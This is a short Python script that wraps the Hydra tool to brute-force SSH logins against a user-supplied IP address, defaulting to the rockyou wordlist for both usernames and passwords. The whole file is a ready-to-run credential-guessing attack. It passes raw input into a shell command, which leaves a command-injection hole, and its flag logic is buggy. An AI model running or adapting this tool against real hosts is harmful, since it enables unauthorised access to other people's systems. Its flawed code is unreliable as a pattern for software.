# Description: This script is used to login to the ssh service using the hydra tool.
import subprocess 
# GetUserflag = False
# Getpassflag = False

#Funcions For Hydra Automation
def GetUser():
  #Getting username from user
  InputValid = input("Do you have username? (Y/N) : ")
  if InputValid.upper() == 'Y':
    UserName = input("[Hydra@Automation] $username : ")
  elif InputValid.upper() == 'N':
    #Default username list
    UserName = "/usr/share/wordlists/rockyou.txt.gz"
  else:
    print("Enter valid input!")
    GetUser()# again call the function
  return UserName

def GetPassword():
  #Getting password from user
  InputValid = input("Do you have password? (Y/N) : ")
  if InputValid.upper() == 'Y':
    password = input("[Hydra@Automation] $password : ")
  elif InputValid.upper() == 'N':
    #Default password list
    password = "/usr/share/wordlists/rockyou.txt.gz"
  else:
    print("Enter valid input")
    GetPassword()
  return password

#Getting ip address from user
def GetIp():
  target = input("[Hydra@Automation] $target_ip : ")
  return target

#Getting user flag
def GetUserflag(input):
  if len(input) >= 2:
    flagUser = '-l' # -l [username]
    return flagUser
  else:
    flagUser = '-L' # -L [username list]
    return flagUser
  
#Getting password flag
def Getpassflag(input):
  if len(input) >= 16: #checking the length of the password
    flagPass = '-P' # -P [password list]
    return flagPass
  else:
    flagPass = '-p' # -p [password]
    return flagPass
  
def main():
  print("          ____  _______    ______  __ _    ____________ ")
  print("         / __ \/ ____/ |  / / __ \/ /| |  / / ____/ __ \ ")	
  print("        / /_/ / __/  | | / / / / / / | | / / __/ / /_/ / ")
  print("       / _, _/ /___  | |/ / /_/ / /__| |/ / /___/ _, _/  ")
  print("      /_/ |_/_____/  |___/\____/_____/___/_____/_/ |_|   ")
  print("     Hydra automation script ... by Hydra@Root~Revolver\n")
  UserName = GetUser()
  Password = GetPassword()
  target = GetIp()
  userFlag = GetUserflag(UserName)
  passFlag = Getpassflag(Password)
  print(f"[Hydra@Automation] $script : hydra {userFlag} {UserName} {passFlag} {Password} ssh://{target} -t 4 -I -V")
  print("Automation processing...")
  result = subprocess.run(f'hydra {userFlag} {UserName} {passFlag} {Password} ssh://{target} -t 4 -I -V', shell=True, stdout=subprocess.PIPE)
  print(result.stdout.decode("utf-8")) #printing the result in structured format
  print("Automation completed!")
  print("Automated login to the server using SSH automation script ... by Hydra@Root~Revolver\n")

main() #calling the main function
